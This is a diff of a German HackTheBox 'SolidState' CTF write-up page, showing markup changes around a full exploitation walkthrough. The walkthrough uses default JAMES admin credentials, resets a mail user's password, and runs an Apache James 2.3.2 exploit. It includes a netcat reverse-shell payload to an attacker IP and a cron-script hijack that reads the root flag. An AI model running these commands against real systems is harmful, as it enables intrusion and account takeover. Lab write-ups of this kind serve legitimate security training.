@@ -46,8 +46,8 @@ Tipps  Scanne mit Nmap alle Ports. Informiere dich was JAMES ist. Außerdem ist 
 <meta itemprop="name" content="HackTheBox - SolidState WriteUp | Tipps &#43; Anleitung">
 <meta itemprop="description" content="SolidState ist eine der vielen Verfügbaren CTF Challenges von HackTheBox. SolidState ist eine leichte bis mittelschwere Maschine von HackTheBox.
 
-Tipps  Scanne mit Nmap alle Ports. Informiere dich was JAMES ist. Außerdem ist Telnet dein Freund. Um nicht eine eingeschränkte Bash-Shell (rbash) zu haben, musst du einen JAMES Exploit benutzen. Benutze LinEnum.sh mit der Option -t. Sieh dir bei den LinEnum Ergebnis World-writable files genau an.  Video"><meta itemprop="datePublished" content="2018-01-27T20:00:56&#43;01:00" />
-<meta itemprop="dateModified" content="2018-01-27T20:00:56&#43;01:00" />
+Tipps  Scanne mit Nmap alle Ports. Informiere dich was JAMES ist. Außerdem ist Telnet dein Freund. Um nicht eine eingeschränkte Bash-Shell (rbash) zu haben, musst du einen JAMES Exploit benutzen. Benutze LinEnum.sh mit der Option -t. Sieh dir bei den LinEnum Ergebnis World-writable files genau an.  Video"><meta itemprop="datePublished" content="2018-01-27T20:00:56+01:00" />
+<meta itemprop="dateModified" content="2018-01-27T20:00:56+01:00" />
 <meta itemprop="wordCount" content="925"><meta itemprop="image" content="/"/>
 <meta itemprop="keywords" content="hackthebox,ctf,german," />
 <meta name="twitter:card" content="summary_large_image"/>
@@ -67,8 +67,8 @@ Tipps  Scanne mit Nmap alle Ports. Informiere dich was JAMES ist. Außerdem ist 
 Tipps  Scanne mit Nmap alle Ports. Informiere dich was JAMES ist. Außerdem ist Telnet dein Freund. Um nicht eine eingeschränkte Bash-Shell (rbash) zu haben, musst du einen JAMES Exploit benutzen. Benutze LinEnum.sh mit der Option -t. Sieh dir bei den LinEnum Ergebnis World-writable files genau an.  Video" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/2018/01/hackthebox-solidstate-writeup-tipps-anleitung/" /><meta property="og:image" content="/"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2018-01-27T20:00:56&#43;01:00" />
-<meta property="article:modified_time" content="2018-01-27T20:00:56&#43;01:00" />
+<meta property="article:published_time" content="2018-01-27T20:00:56+01:00" />
+<meta property="article:modified_time" content="2018-01-27T20:00:56+01:00" />
 
 
 
@@ -168,7 +168,7 @@ Tipps  Scanne mit Nmap alle Ports. Informiere dich was JAMES ist. Außerdem ist 
 <p><a href="http://www.youtube.com/watch?v=VswM2eqrTk4"><img src="http://img.youtube.com/vi/VswM2eqrTk4/0.jpg" alt="video walkthrough"></a></p>
 <h2 id="anleitung"><strong>Anleitung</strong></h2>
 <p>Zuerst wie gewohnt ein Nmap-Scan. Hierbei ist es wichtig, dass wir explizit alle Ports scannen, da bei einem Standard-Scan ein offener Port nicht gefunden wird. Mit der Option <strong>-p-</strong> scannen wir alle Ports. Die Option <strong>-A</strong> sorgt dafür, dass Nmap das Betriebssystem und die Services herausfindet.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A -p- 10.10.10.51
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A -p- 10.10.10.51
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
@@ -181,7 +181,7 @@ PORT     STATE SERVICE VERSION
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </code></pre></div><p><a href="https://de.wikipedia.org/wiki/Apache_James">JAMES</a> ist ein Mailserver. Der Port 4555 mit dem Service <strong>james-admin</strong> sieht vielversprechend aus.</p>
 <p>Versuchen wir doch mal eine Telnet-Verbindung zum Port 4555 aufzubauen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# telnet 10.10.10.51 <span style="color:#ae81ff">4555</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# telnet 10.10.10.51 <span style="color:#ae81ff">4555</span>
 Trying 10.10.10.51...
 Connected to 10.10.10.51.
 Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
@@ -193,7 +193,7 @@ Password:
 root
 Welcome root. HELP <span style="color:#66d9ef">for</span> a list of commands
 </code></pre></div><p>Die Standard Credentials für das <strong>JAMES Remote Administration Tool</strong> ist root / root. Ein Glück, dass dieses noch nicht geändert wurde.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt;&gt;help
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt;&gt;help
 Currently implemented commands:
 help display this help
 listusers display existing accounts
@@ -202,7 +202,7 @@ setpassword <span style="color:#f92672">[</span>username<span style="color:#f926
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 quit close connection
 </code></pre></div><p>Die für uns interessanten Befehle sind <strong>listusers</strong> und <strong>setpassword</strong>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">listusers
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">listusers
 Existing accounts <span style="color:#ae81ff">6</span>
 user: james
 user: ../../../../../../../../etc/bash_completion.d
@@ -211,14 +211,14 @@ user: john
 user: mindy
 user: mailadmin
 </code></pre></div><p>Wir sehen 6 verschiedene Accounts. Wir können nun die Passwörter dieser Accounts mit Hilfe von <strong>setpassword [username] [password]</strong> ändern, um uns als diese anmelden zu können.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt;&gt;setpassword mindy m10x
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt;&gt;setpassword mindy m10x
 Password <span style="color:#66d9ef">for</span> mindy reset
 
 &gt;&gt;quit
 Bye
 Connection closed by foreign host.
 </code></pre></div><p>Verbinden wir uns nun per Telnet mit dem POP3 Service. Eine Liste mit den möglichen Befehlen für <a href="http://www.suburbancomputer.com/tips_email.htm">POP3</a> kannst du hier finden.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# telnet 10.10.10.51 <span style="color:#ae81ff">110</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# telnet 10.10.10.51 <span style="color:#ae81ff">110</span>
 Trying 10.10.10.51...
 Connected to 10.10.10.51.
 Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
@@ -255,7 +255,7 @@ quit
 Connection closed by foreign host.
 </code></pre></div><p>Wir haben nun die SSH-Login Daten. Allerdings können wir damit noch nicht soviel anfangen, da wir durch den Login als Mindy nur eine <a href="https://www.tecchannel.de/a/ratgeber-shells-fuer-linux-und-unix-richtig-nutzen,2038218,4">eingeschränkte Bash-Shell (rbash)</a> haben, bei welcher nur die Befehle <strong>cat</strong> und <strong>ls</strong> erlaubt sind. Bei den anderen Emails ist nichts interessantes zu finden. Was nun?</p>
 <p>Suchen wir doch mal nach Schwachstellen im Bezug auf JAMES mit der Version 2.3.2.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# searchsploit james 2.3.2
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# searchsploit james 2.3.2
 -------------------------------------------------------------------------------------
 Exploit Title                                        | Path
                                                      | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
@@ -264,18 +264,18 @@ Apache James Server 2.3.2 - Remote Command Execution | exploits/linux/remote/355
 -------------------------------------------------------------------------------------
 </code></pre></div><p>**Remote Command Execution **klingt doch nett. <a href="https://www.exploit-db.com/exploits/35513/">Hier</a> ist der Link zu dem Exploit.</p>
 <p>Kopieren wir uns das Script.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# cp /usr/share/exploitdb/exploits/linux/remote/35513.py /home/SolidState/james.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# cp /usr/share/exploitdb/exploits/linux/remote/35513.py /home/SolidState/james.py
 </code></pre></div><p>Jetzt müssen wir es nur noch anpassen. Als Payload können wir ein <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Netcat Reverse Shell</a> benutzen. Außerdem können wir noch den <strong>hostname</strong> festlegen, welcher hier <strong>solidstate</strong> ist.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# vi james.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# vi james.py
 payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.222 1234 &gt;/tmp/f&#39;</span> <span style="color:#75715e">#Zeile19</span>
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 <span style="color:#75715e">#also try s.send(&#34;rcpt to: &lt;../../../../../../../../etc/bash_completion.d@hostname&gt;\r\n&#34;) if the recipient cannot be found</span>
 s.send<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rcpt to: &lt;../../../../../../../../etc/bash_completion.d@solidstate&gt;\r\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#75715e">#zeile 59</span>
 </code></pre></div><p>Nun hören wir mit Netcat den Port ab, den wir im Script vorhin festgelegt haben.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# nc -lnvp <span style="color:#ae81ff">1234</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# nc -lnvp <span style="color:#ae81ff">1234</span>
 listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1234</span> ...
 </code></pre></div><p>Parallel dazu führen wir das Script aus.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# python james.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# python james.py
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span>Usage: python james.py &lt;ip&gt;
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span>Exemple: python james.py 127.0.0.1
 root@kali:/home/SolidState# python james.py 10.10.10.51
@@ -285,15 +285,15 @@ root@kali:/home/SolidState# python james.py 10.10.10.51
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>Sending payload...
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>Done! Payload will be executed once somebody logs in.
 </code></pre></div><p>Jetzt muss sich nur noch jemand über SSH anmelden!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# ssh mindy@10.10.10.51
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/home/SolidState# ssh mindy@10.10.10.51
 mindy@10.10.10.51<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
 Linux solidstate 4.9.0-3-686-pae <span style="color:#75715e">#1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686</span>
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </code></pre></div><p>Wir haben Zugriff!</p>
 <p>Nun können wir die Shell zu einer <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">fully interactive TTY</a> upgraden, damit wir <strong>autocomplete, su etc.</strong> haben.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ python3 -c <span style="color:#e6db74">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ python3 -c <span style="color:#e6db74">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
 </code></pre></div><p>Mit Hilfe von <strong>wget</strong> können wir <a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a> downloaden (nachdem wir bei uns den Apache2 Server durch <strong>service apache2 start</strong> gestartet und die Datei in den Ordner <strong>/var/www/html/</strong> kopiert haben) und ausführen, welches uns die Enumeration und Privilege Escalation Checks abnimmt.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#e6db74">${</span>debian_chroot:+($debian_chroot)<span style="color:#e6db74">}</span>mindy@solidstate:~$ wget 10.10.15.222/LinEnum.sh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#e6db74">${</span>debian_chroot:+($debian_chroot)<span style="color:#e6db74">}</span>mindy@solidstate:~$ wget 10.10.15.222/LinEnum.sh
 
 <span style="color:#e6db74">${</span>debian_chroot:+($debian_chroot)<span style="color:#e6db74">}</span>mindy@solidstate:~$ bash LinEnum.sh -t
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
@@ -302,7 +302,7 @@ World-writable files <span style="color:#f92672">(</span>excluding /proc<span st
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </code></pre></div><p>Das Script hat eine Datei gefunden, welche dem User und der Gruppe <strong>root</strong> gehört, aber für jeden schreib-, lese- und ausführbar ist.</p>
 <p>Sehen wir uns doch mal an, was sich in dem Python-Script steht.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#e6db74">${</span>debian_chroot:+($debian_chroot)<span style="color:#e6db74">}</span>mindy@solidstate:~$ vi /opt/tmp.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#e6db74">${</span>debian_chroot:+($debian_chroot)<span style="color:#e6db74">}</span>mindy@solidstate:~$ vi /opt/tmp.py
 <span style="color:#75715e">#!/usr/bin/env python</span>
 import os
 import sys
@@ -312,9 +312,9 @@ except:
      
 sys.exit<span style="color:#f92672">()</span>
 </code></pre></div><p>Wir können nun die 5. Zeile etwas abändern&hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /root/root.txt &gt; /tmp/m10x.txt&#39;</span><span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /root/root.txt &gt; /tmp/m10x.txt&#39;</span><span style="color:#f92672">)</span>
 </code></pre></div><p>Wenn wir nun ein wenig warten, wird <strong>tmp.py</strong> ausgeführt und unter <strong>/tmp/m10x.txt</strong> können wir dann den Root-Hash finden. Anscheinend ist <strong>/opt/tmp.py</strong> ein Cron-Job!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#e6db74">${</span>debian_chroot:+($debian_chroot)<span style="color:#e6db74">}</span>mindy@solidstate:~$ ls /tmp/
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#e6db74">${</span>debian_chroot:+($debian_chroot)<span style="color:#e6db74">}</span>mindy@solidstate:~$ ls /tmp/
 m10x.txt
 <span style="color:#e6db74">${</span>debian_chroot:+($debian_chroot)<span style="color:#e6db74">}</span>mindy@solidstate:~$ cat /tmp/m10x.txt
 b4c#########ZENSIERT#########7c9
